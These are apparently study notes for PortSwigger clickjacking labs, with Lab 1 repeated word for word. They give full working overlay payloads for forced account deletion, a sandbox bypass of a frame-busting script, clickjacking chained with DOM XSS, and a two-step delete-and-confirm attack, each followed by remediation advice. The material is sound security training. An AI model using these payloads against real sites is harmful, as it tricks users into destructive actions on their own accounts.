# 🧠 Lab-1 — Delete Account (CSRF-protected button)

---

## 1️⃣ OVERVIEW

This lab demonstrates Clickjacking (UI redressing) where:

> A user is tricked into clicking a hidden “Delete Account” button inside an iframe using a fake clickable overlay.

Even though the button is protected by a CSRF token, clickjacking still works because:

👉 the user performs a REAL click inside their authenticated session

---

## 2️⃣ KEY CONCEPT

Fake UI (Click me) → overlays real website  
Real site (iframe) → executes Delete Account action

---

## 3️⃣ LAB OBJECTIVE

Exploit:

/my-account page

Delete Account button (sensitive action)

CSRF-protected endpoint

👉 Goal: force victim click → delete their account

---

## 4️⃣ WHY CSRF TOKEN DOES NOT HELP HERE

CSRF protects request forgery  
Clickjacking uses real user interaction

So:

CSRF token is valid

request is legitimate

but user is tricked into clicking it

---

## 5️⃣ FINAL WORKING PAYLOAD
```
<style>
iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
}

div {
    position: absolute;
    top: 300px;
    left: 60px;
    z-index: 1;
    background: red;
    padding: 10px;
    font-size: 18px;
}
</style>

<div>Click me</div>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```
---

## 6️⃣ PAYLOAD BREAKDOWN (LINE BY LINE)

---

### 🧩 iframe (real website)
```
iframe {
```
Loads real target website inside attacker page.

---
```
position: relative;
```
Allows positioning inside layout.

---
```
width / height
```
Controls visible area so Delete button is inside view.

---
```
opacity: 0.0001;
```
Makes real site invisible but still clickable.

---
```
z-index: 2;
```
Places iframe above fake UI in stacking order.

---

### 🧩 DIV (fake button)
```
div {
```
Fake clickable element shown to victim.

---
```
position: absolute;
```
Allows precise placement over target button.

---
```
top / left
```
Aligns fake click zone over Delete Account button.

---
```
background: red;
```
Makes button visible and convincing.

---

### 🧩 HTML element
```
<div>Click me</div>
```
This is what victim sees and clicks.

---

### 🧩 iframe source
```
<iframe src=".../my-account"></iframe>
```
Loads authenticated account page containing Delete button.

---

## 7️⃣ LAB WALKTHROUGH (STEP-BY-STEP)

---

### Step 1 — Login

User logs in:

wiener:peter

---

### Step 2 — Target identification

Page contains:

Delete Account button (sensitive action)

---

### Step 3 — Build exploit page

Attacker creates HTML page:

fake “Click me”

hidden iframe with target page

---

### Step 4 — Alignment phase

Adjust:

top

left

opacity (debug mode first)

Until:

Click me overlaps Delete Account button

---

### Step 5 — Deliver exploit

Victim loads page → clicks fake button

---

### Step 6 — Execution

Click → Delete Account request sent inside authenticated session

---

### Step 7 — Lab solved

Account deleted.

---

## 8️⃣ REAL-WORLD SCENARIO

Clickjacking works best on:

---

### 💰 Banking systems

transfer funds

add beneficiary

approve payments

---

### 🔐 Account security

delete account

change email/password

disable MFA

---

### 📦 SaaS platforms

API key regeneration

webhook changes

admin role assignment

---

## 9️⃣ ATTACK VARIATIONS

---

### Variant 1: Fake reward page

“Click to claim prize”
→ deletes account or changes settings

---

### Variant 2: Multi-step clickjacking

Step 1: open settings  
Step 2: confirm deletion

---

### Variant 3: Mobile UI redressing

touch misalignment

gesture-based deception

---

## 0️⃣ WHY THIS ATTACK WORKS

- user is authenticated
- cookies auto-sent to iframe
- CSRF token is already valid
- user performs real click

---

## 1️⃣ REMEDIATION

---

### ❌ X-Frame-Options

DENY / SAMEORIGIN

Prevents iframe embedding.

---

### ❌ CSP frame-ancestors

Controls allowed embedding domains

---

### ❌ UI defenses

confirmation dialogs

re-authentication for sensitive actions

double-click confirmations

---

### ❌ UX protections

avoid single-click destructive actions

add explicit warnings

---

## 2️⃣ KEY SECURITY INSIGHT

Clickjacking does NOT bypass authentication — it abuses user interaction inside an authenticated session.

---

## 🔥 FINAL SUMMARY

- Clickjacking is a UI redressing attack where:

- attacker embeds real site in iframe

- overlays fake clickable element

- user unknowingly clicks real sensitive button

- action executes inside authenticated session

---

# 🧠 Lab-2 — Delete Account (CSRF-protected button)

---

## 1️⃣ OVERVIEW

This lab demonstrates Clickjacking (UI redressing) where:

> A user is tricked into clicking a hidden “Delete Account” button inside an iframe using a fake clickable overlay.

Even though the button is protected by a CSRF token, clickjacking still works because:

👉 the user performs a REAL click inside their authenticated session

---

## 2️⃣ KEY CONCEPT

Fake UI (Click me) → overlays real website  
Real site (iframe) → executes Delete Account action

---

## 3️⃣ LAB OBJECTIVE

Exploit:

/my-account page

Delete Account button (sensitive action)

CSRF-protected endpoint

👉 Goal: force victim click → delete their account

---

## 4️⃣ WHY CSRF TOKEN DOES NOT HELP HERE

CSRF protects request forgery  
Clickjacking uses real user interaction

So:

CSRF token is valid

request is legitimate

but user is tricked into clicking it

---

## 5️⃣ FINAL WORKING PAYLOAD
```
<style>
iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
}

div {
    position: absolute;
    top: 300px;
    left: 60px;
    z-index: 1;
    background: red;
    padding: 10px;
    font-size: 18px;
}
</style>

<div>Click me</div>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```
---

## 6️⃣ PAYLOAD BREAKDOWN (LINE BY LINE)

---

### 🧩 iframe (real website)

iframe {

Loads real target website inside attacker page.

---

position: relative;

Allows positioning inside layout.

---

width / height

Controls visible area so Delete button is inside view.

---

opacity: 0.0001;

Makes real site invisible but still clickable.

---

z-index: 2;

Places iframe above fake UI in stacking order.

---

### 🧩 DIV (fake button)

div {

Fake clickable element shown to victim.

---

position: absolute;

Allows precise placement over target button.

---

top / left

Aligns fake click zone over Delete Account button.

---

background: red;

Makes button visible and convincing.

---

### 🧩 HTML element

<div>Click me</div>

This is what victim sees and clicks.

---

### 🧩 iframe source
```
<iframe src=".../my-account"></iframe>
```
Loads authenticated account page containing Delete button.

---

## 7️⃣ LAB WALKTHROUGH (STEP-BY-STEP)

---

### Step 1 — Login

User logs in:

wiener:peter

---

### Step 2 — Target identification

Page contains:

Delete Account button (sensitive action)

---

### Step 3 — Build exploit page

Attacker creates HTML page:

fake “Click me”

hidden iframe with target page

---

### Step 4 — Alignment phase

Adjust:

top

left

opacity (debug mode first)

Until:

Click me overlaps Delete Account button

---

### Step 5 — Deliver exploit

Victim loads page → clicks fake button

---

### Step 6 — Execution

Click → Delete Account request sent inside authenticated session

---

### Step 7 — Lab solved

Account deleted.

---

## 8️⃣ REAL-WORLD SCENARIO

Clickjacking works best on:

---

### 💰 Banking systems

transfer funds

add beneficiary

approve payments

---

### 🔐 Account security

delete account

change email/password

disable MFA

---

### 📦 SaaS platforms

API key regeneration

webhook changes

admin role assignment

---

## 9️⃣ ATTACK VARIATIONS

---

### Variant 1: Fake reward page

“Click to claim prize”
→ deletes account or changes settings

---

### Variant 2: Multi-step clickjacking

Step 1: open settings  
Step 2: confirm deletion

---

### Variant 3: Mobile UI redressing

touch misalignment

gesture-based deception

---

## 0️⃣ WHY THIS ATTACK WORKS

- user is authenticated
- cookies auto-sent to iframe
- CSRF token is already valid
- user performs real click

---

## 1️⃣ REMEDIATION

---

### ❌ X-Frame-Options

DENY / SAMEORIGIN

Prevents iframe embedding.

---

### ❌ CSP frame-ancestors

Controls allowed embedding domains

---

### ❌ UI defenses

confirmation dialogs

re-authentication for sensitive actions

double-click confirmations

---

### ❌ UX protections

avoid single-click destructive actions

add explicit warnings

---

## 2️⃣ KEY SECURITY INSIGHT

Clickjacking does NOT bypass authentication — it abuses user interaction inside an authenticated session.

---

## 🔥 FINAL SUMMARY

- Clickjacking is a UI redressing attack where:

- attacker embeds real site in iframe

- overlays fake clickable element

- user unknowingly clicks real sensitive button

- action executes inside authenticated session

---

# 🧠 Lab-3 (FRAME BUSTING BYPASS) — COMPLETE NOTES

## 📌 1️⃣ OVERVIEW

Clickjacking is a UI redressing attack where:

User is tricked into clicking a hidden real button while thinking they are clicking a harmless element

It works by:

- Overlaying a transparent iframe
- Aligning fake UI on top of real buttons
- Exploiting trust in visual interfaces

## 📌 2️⃣ WHAT IS THE TOPIC?

This lab covers:

### 🧩 Core concept:

Clickjacking + frame busting bypass

### 🧩 Key idea:

Website tries to block iframe embedding using JavaScript (frame buster)

### 🧩 Attacker goal:

- Bypass frame busting
- Trick user into clicking sensitive action (update email)

## 📌 3️⃣ LAB OBJECTIVE

Force victim to change email address by clicking a fake "Click me" button

## 📌 4️⃣ ATTACK PREREQUISITES

✔ Victim logged in  
✔ Sensitive action exists (Update Email)  
✔ Page is frameable (or bypassed using sandbox)

## 📌 5️⃣ KEY VULNERABILITY

Frame busting script exists:

```javascript
if (window !== window.top) {
    window.top.location = window.location;
}
```

Problem:

- It is client-side JavaScript
- Can be neutralized using browser sandbox

## 📌 6️⃣ BYPASS TECHNIQUE

```html
sandbox="allow-forms"
```

Effect:

✔ allows form submission  
❌ blocks frame-busting escape attempts

## 📌 7️⃣ LAB WALKTHROUGH (STEP-BY-STEP)

### 🟢 Step 1 — Login

wiener:peter

### 🟢 Step 2 — Open exploit server

Inject HTML payload

### 🟢 Step 3 — Load target in iframe

/my-account?email=attacker@email.com

### 🟢 Step 4 — Overlay fake button

Use `<div>` as decoy UI

### 🟢 Step 5 — Align click position

Use:

- opacity = 0.1 (debug)
- adjust top until overlap matches button center

### 🟢 Step 6 — Final attack

Set:

```css
opacity: 0.0001;
```

### 🟢 Step 7 — Deliver exploit

Victim clicks → email changes → lab solved

## 📌 8️⃣ FINAL PAYLOAD (WORKING VERSION)

```html
<style>
iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
}

div {
    position: absolute;
    top: 485px;
    left: 80px;
    z-index: 1;
}
</style>

<div>CLICK ME</div>

<iframe
sandbox="allow-forms"
src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=attacker@email.com">
</iframe>
```

## 📌 9️⃣ PAYLOAD BREAKDOWN

### 🧩 iframe

Loads real victim page inside attacker page

### 🧩 sandbox

Prevents frame busting script from escaping iframe

### 🧩 email parameter

Pre-fills form automatically to speed attack

### 🧩 div (fake button)

Visible UI that user clicks instead of real button

### 🧩 top + left

Controls pixel alignment between fake and real button

### 🧩 opacity

Makes real page invisible but still clickable

## 📌 0️⃣ REAL-WORLD SCENARIOS

### 🧨 1. Banking apps

- “Confirm transfer”
- “Change email”
- “Add beneficiary”

### 🧨 2. Social media

- “Follow user”
- “Like post”
- “Change settings”

### 🧨 3. Admin panels

- delete user
- change role
- reset password

## 📌 1️⃣ VARIATIONS

### 🔹 Clickjacking + CSRF combo

Click triggers state-changing request with victim session

### 🔹 Prefilled attack

URL parameters pre-fill sensitive form values

### 🔹 Hidden iframe navigation

Multiple pages chained inside iframe

## 📌 2️⃣ MULTI-CHAIN ATTACK MODEL

Click → iframe action → authenticated request → sensitive change → backend update

## 📌 3️⃣ REMEDIATION

### 🛡️ 1. X-Frame-Options

```http
DENY
SAMEORIGIN
```

Blocks iframe embedding.

### 🛡️ 2. CSP frame-ancestors

```http
frame-ancestors 'none';
```

Modern and stronger protection.

### 🛡️ 3. Avoid UI-based sensitive actions

- Require re-authentication
- Use confirmation tokens

### 🛡️ 4. CSRF tokens (NOT enough alone)

CSRF does NOT stop clickjacking

## 📌 4️⃣ KEY MINDSET

Clickjacking is not about hacking code — it's about hacking human perception of UI

## 🔥 FINAL ONE-LINE SUMMARY

Clickjacking works by hiding a real sensitive button inside an iframe and tricking the user into clicking it through a fake UI, bypassed in this lab using sandbox + pixel-perfect alignment.

If you want next, I can upgrade your understanding to:

👉 “real bug bounty clickjacking techniques (zero-frame-busting + CSP bypass + multi-step attacks)”

---

# 🧠 Lab-4 CLICKJACKING + DOM XSS (print() LAB) 

## 📌 1️⃣ OVERVIEW

This lab combines Clickjacking + DOM XSS.

User is tricked into clicking a hidden real button → which triggers a DOM XSS payload → executes `print()`

So it is a two-layer attack:

- UI deception (clickjacking)
- Code execution (XSS)

## 📌 2️⃣ WHAT IS THE TOPIC?

### 🧩 Concepts involved:

- Clickjacking (UI redressing)
- DOM-based XSS
- iframe embedding
- Event-based XSS (`onerror=print()`)

### 🧩 Goal:

Force victim to trigger `print()` without realizing it

## 📌 3️⃣ VULNERABILITY IDEA

Target page contains:

```html
<img src=1 onerror=print()>
```

Meaning:

- Image fails to load
- `onerror` triggers JavaScript
- `print()` executes

## 📌 4️⃣ WHY IT IS VULNERABLE

User input is reflected directly into HTML without sanitization

So attacker-controlled input becomes executable code.

## 📌 5️⃣ ATTACK FLOW (HIGH LEVEL)

1️⃣ Attacker injects XSS payload in URL  
2️⃣ Page executes `print()` when triggered  
3️⃣ Clickjacking overlay hides real page  
4️⃣ User clicks fake button  
5️⃣ Real XSS triggers

## 📌 6️⃣ LAB WALKTHROUGH (STEP-BY-STEP)

### 🟢 Step 1 — Open exploit server

Insert HTML payload

### 🟢 Step 2 — Load vulnerable page inside iframe

```text
/feedback?name=<img src=1 onerror=print()>
```

### 🟢 Step 3 — Add clickjacking overlay

```html
<div>Click me</div>
```

User thinks this is harmless.

### 🟢 Step 4 — Align overlay

Use:

- `opacity = 0.1` (debug mode)
- adjust `top/left` until button matches real “Submit”

### 🟢 Step 5 — Finalize attack

Set:

```css
opacity = 0.0001;
```

### 🟢 Step 6 — Deliver exploit

Victim clicks fake button

### 🟢 Step 7 — XSS triggers

`print()` function executes

## 📌 7️⃣ FINAL PAYLOAD

```html
<style>
iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
}

div {
    position: absolute;
    top: 610px;
    left: 80px;
    z-index: 1;
}
</style>

<div>Click me</div>

<iframe
src="https://YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=test@test.com&subject=test&message=test#feedbackResult">
</iframe>
```

## 📌 8️⃣ PAYLOAD BREAKDOWN

### 🧩 iframe

Loads vulnerable page inside attacker page

### 🧩 XSS payload

```html
<img src=1 onerror=print()>
```

Executes JavaScript when image fails.

### 🧩 div overlay

Fake clickable UI shown to user

### 🧩 opacity

Hides real page but keeps it clickable

### 🧩 positioning

Aligns fake click with real submit button

## 📌 9️⃣ REAL-WORLD SCENARIOS

- Forced popup printing
- Fake login redirects
- Hidden malware execution
- Session stealing via chained XSS
- UI trick attacks in phishing pages

## 📌 0️⃣ VARIATIONS

### 🔹 Clickjacking + stored XSS

### 🔹 Clickjacking + DOM XSS

### 🔹 Clickjacking + CSRF action

### 🔹 Multi-step iframe chaining attacks

## 📌11️⃣ ATTACK CHAIN MODEL

```text
Fake button click
    ↓
iframe triggers URL
    ↓
DOM XSS executes
    ↓
JavaScript runs (print)
```

## 📌 2️⃣ REMEDIATION

### 🛡️ 1. CSP (Content Security Policy)

```http
script-src 'self'
```

### 🛡️ 2. Input sanitization

- escape HTML
- block event handlers like `onerror`

### 🛡️ 3. X-Frame-Options

```http
DENY
SAMEORIGIN
```

### 🛡️ 4. frame-ancestors CSP

```http
frame-ancestors 'none'
```

## 📌 3️⃣ KEY MINDSET

Clickjacking is UI manipulation, XSS is code execution — combining both removes user awareness completely.

## 🔥 FINAL SUMMARY

This lab uses clickjacking to force a user click on a hidden iframe that contains a DOM XSS payload, which executes `print()` when triggered.

If you want next, I can give you:

👉 “a master map of all clickjacking lab types + how to recognize them instantly in exams”

---

# 🧠 Lab-5 MULTI-STEP CLICKJACKING (CONFIRMATION BYPASS LAB) — COMPLETE NOTES

## 📌 1️⃣ OVERVIEW

This lab demonstrates an advanced form of clickjacking where:

User is tricked into performing TWO sequential sensitive actions using layered fake UI elements

It extends basic clickjacking by adding:

- Multi-step interaction flow
- Confirmation dialog bypass
- Precision pixel alignment

## 📌 2️⃣ WHAT IS THE TOPIC?

### 🧩 Core concepts:

- Clickjacking (UI redressing)
- Multi-step attack chaining
- DOM layering (iframe + div overlays)
- State change handling in web apps

### 🧩 Goal:

Force user to delete account by clicking two fake buttons:

1️⃣ Delete account  
2️⃣ Confirm (Yes)

## 📌 3️⃣ VULNERABILITY IDEA

The target page:

- Loads inside an iframe
- Has sensitive action: Delete account
- Shows confirmation dialog after first click

Attacker abuses:

User clicks fake UI → real clicks are executed inside iframe

## 📌 4️⃣ ATTACK FLOW (VISUAL MODEL)

```text
Click 1 → triggers Delete account
Click 2 → triggers Confirm Yes
```

Both clicks are mapped using overlays.

## 📌 5️⃣ KEY INSIGHT FROM YOUR EXPERIMENT

You observed:

- First click position ≈ 500px
- Second click position ≈ 300px

This confirms:

Different UI states require different pixel alignment

## 📌 6️⃣ WHY TWO DIFFERENT TOP VALUES WORK

Because after first click:

### 🧩 Step 1 screen:

Delete button visible → aligned at ~500px

### 🧩 Step 2 screen:

Confirmation dialog appears → aligned at ~300px

So:

Each UI state has its own coordinate system

## 📌 7️⃣ LAB WALKTHROUGH (STEP-BY-STEP)

### 🟢 Step 1 — Load account page in iframe

```text
/my-account
```

### 🟢 Step 2 — Create fake UI layers

- “Click me first”
- “Click me next”

### 🟢 Step 3 — Align first click

```text
top ≈ 500px
```

👉 maps to Delete Account button

### 🟢 Step 4 — Align second click

```text
top ≈ 300px
```

👉 maps to confirmation “Yes” button

### 🟢 Step 5 — Use opacity debug mode

```css
opacity: 0.1;
```

Used for alignment testing.

### 🟢 Step 6 — Final exploit mode

```css
opacity: 0.0001;
```

### 🟢 Step 7 — Deliver exploit

Victim clicks:

1️⃣ Delete account  
2️⃣ Confirm yes

## 📌 8️⃣ FINAL PAYLOAD (CLEAN VERSION)

```html
<style>
iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
}

.firstClick, .secondClick {
    position: absolute;
    z-index: 1;
}

.firstClick {
    top: 500px;
    left: 50px;
}

.secondClick {
    top: 300px;
    left: 225px;
}
</style>

<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

## 📌 9️⃣ PAYLOAD BREAKDOWN

### 🧩 iframe

Loads real account page inside attacker-controlled page

### 🧩 firstClick

Triggers delete account action

### 🧩 secondClick

Triggers confirmation dialog (Yes button)

### 🧩 opacity

Hides real UI but keeps it clickable

### 🧩 positioning (top/left)

Maps fake UI to real button coordinates in each UI state

## 📌 0️⃣ REAL-WORLD SCENARIOS

- Account deletion attacks
- Payment confirmation fraud
- Subscription cancellation abuse
- Admin panel privilege changes
- Multi-step workflow manipulation

## 📌 1️⃣ VARIATION INSIGHT

Each UI state = new coordinate map inside iframe

Attackers must re-align for:

- popups
- modals
- redirects
- confirmation dialogs

## 📌 2️⃣ MULTI-CHAIN MODEL

```text
Fake click → real delete → confirmation → final action
```

## 📌 3️⃣ REMEDIATION

### 🛡️ 1. X-Frame-Options

```http
DENY
SAMEORIGIN
```

### 🛡️ 2. CSP frame-ancestors

```http
frame-ancestors 'none'
```

### 🛡️ 3. Avoid critical actions via UI only

Require:

- password re-entry
- OTP confirmation
- server-side confirmation tokens

## 📌 4️⃣ KEY MINDSET

Multi-step clickjacking is precise UI manipulation across multiple application states, where each click is mapped to a different UI layer inside an iframe.

## 🔥 FINAL SUMMARY

This lab uses multi-step clickjacking where two fake buttons are aligned to two different UI states (delete and confirm), allowing an attacker to force account deletion through sequential hidden clicks.

If you want next, I can show you:

👉 “how to solve any multi-step clickjacking lab in under 90 seconds using pattern recognition (no guessing)”
